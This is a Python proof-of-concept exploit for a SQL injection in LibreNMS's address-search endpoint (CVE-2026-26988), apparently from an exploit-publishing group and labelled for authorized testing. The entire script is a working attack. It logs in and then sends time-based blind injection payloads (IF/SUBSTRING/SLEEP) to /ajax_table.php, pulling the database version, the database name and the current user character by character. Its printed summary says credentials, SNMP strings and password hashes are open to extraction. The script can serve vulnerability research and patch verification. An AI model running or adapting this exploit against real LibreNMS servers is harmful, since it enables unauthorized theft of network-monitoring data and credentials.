#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : LibreNMS <= 25.12.0 SQL Injection via Address Search
# CVE            : CVE-2026-26988
# Vendor         : librenms
# Product        : LibreNMS
# Affected       : <= 25.12.0 (through 26.1.1)
# Type           : CWE-89 - SQL Injection
# CVSS           : 9.1 (Critical)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-28
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
PoC Vector 3 for CVE-2026-26988: Time-Based Blind Data Extraction

Demonstrates actual data exfiltration from the database using
conditional time-based blind SQL injection. Unlike the simple
SLEEP(N) test in poc.py, this script extracts real data by
testing each character position with IF(condition, SLEEP, 0).

Technique:
    1' OR IF(SUBSTRING((<query>),<pos>,1)='<char>', SLEEP(2), 0)-- -

For each character position, we brute-force the character value.
A delay means the character matches.

This PoC extracts:
    1. MySQL version string (first 12 chars)
    2. Database name
    3. Current DB user

This proves the full impact: arbitrary database content extraction.

Usage:
    python3 poc_vector3.py [host] [port] [username] [password]
"""

import sys
import os
import time
import string

# Add script directory to path for shared module import
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from librenms_session import authenticate


# --- Configuration ---

DEFAULT_HOST = "172.19.0.4"
DEFAULT_PORT = 8000
DEFAULT_USER = "admin"
DEFAULT_PASS = "Cvelab2026!sqli"

SLEEP_SECONDS = 2       # Delay per character match
DELAY_THRESHOLD = 1.5   # Threshold to consider SLEEP fired
MAX_CHARS = 15          # Max chars to extract per value
# Characters to test (optimized order: digits, lowercase, common symbols first)
CHARSET = string.digits + string.ascii_lowercase + ".-_@" + string.ascii_uppercase


# --- Blind extraction ---

def send_sqli_timed(session, address_payload):
    """Send injection request and return elapsed time."""
    _, _, elapsed = session.post("/ajax_table.php", {
        "id": "address-search",
        "search_type": "ipv6",
        "address": address_payload,
        "current": "1",
        "rowCount": "10",
    })
    return elapsed


def extract_char(session, subquery, position):
    """
    Extract a single character at the given position from a subquery result.

    Uses: IF(SUBSTRING((<subquery>),<pos>,1)='<c>', SLEEP(N), 0)
    If the character matches, SLEEP fires and we detect the delay.
    """
    for ch in CHARSET:
        ch_escaped = ch.replace("'", "\\'")
        payload = (
            f"::1/1' OR IF(SUBSTRING(({subquery}),{position},1)='{ch_escaped}',"
            f"SLEEP({SLEEP_SECONDS}),0)-- -"
        )
        elapsed = send_sqli_timed(session, payload)
        if elapsed >= DELAY_THRESHOLD:
            return ch
    return None  # No match found (end of string or unexpected char)


def extract_value(session, label, subquery, max_chars=MAX_CHARS):
    """Extract a full value from the database character by character."""
    print(f"\n[*] Extracting: {label}")
    print(f"    Subquery: {subquery}")
    print(f"    Technique: IF(SUBSTRING((...),pos,1)='c', SLEEP({SLEEP_SECONDS}), 0)")
    print(f"    Extracting: ", end="", flush=True)

    result = ""
    for pos in range(1, max_chars + 1):
        ch = extract_char(session, subquery, pos)
        if ch is None:
            break
        result += ch
        print(ch, end="", flush=True)

    print()  # newline after chars
    if result:
        print(f"    [+] EXTRACTED: {result}")
    else:
        print(f"    [-] Could not extract data")
    return result


# --- Main ---

def exploit(host, port, username, password):
    """Run blind data extraction PoC."""
    base_url = f"http://{host}:{port}"

    print("=" * 70)
    print("  CVE-2026-26988: Blind SQL Injection Data Extraction (Vector 3)")
    print("  Technique: Conditional time-based blind (IF + SLEEP)")
    print(f"  Target:   {base_url}")
    print(f"  Charset:  {len(CHARSET)} chars | Sleep: {SLEEP_SECONDS}s | Max: {MAX_CHARS} chars")
    print("=" * 70)

    session = authenticate(host, port, username, password)
    if session is None:
        return False

    results = {}

    # Extract MySQL version (first 12 chars)
    results["MySQL Version"] = extract_value(
        session, "MySQL Version",
        "SELECT VERSION()", max_chars=12
    )

    # Extract current database name
    results["Database Name"] = extract_value(
        session, "Current Database",
        "SELECT DATABASE()", max_chars=12
    )

    # Extract current user
    results["DB User"] = extract_value(
        session, "Database User",
        "SELECT CURRENT_USER()", max_chars=15
    )

    # Summary
    print("\n" + "=" * 70)
    print("DATA EXTRACTION RESULTS")
    print("=" * 70)
    any_success = False
    for label, value in results.items():
        status = value if value else "FAILED"
        if value:
            any_success = True
        print(f"  {label:20s}: {status}")

    if any_success:
        print(f"\n[+] DATA EXTRACTION CONFIRMED!")
        print(f"    Attacker can extract arbitrary database content via blind SQLi.")
        print(f"    Full impact: credentials, SNMP strings, device configs, user hashes")
        return True
    else:
        print(f"\n[-] Data extraction failed")
        return False


if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT
    username = sys.argv[3] if len(sys.argv) > 3 else DEFAULT_USER
    password = sys.argv[4] if len(sys.argv) > 4 else DEFAULT_PASS

    success = exploit(host, port, username, password)
    sys.exit(0 if success else 1)
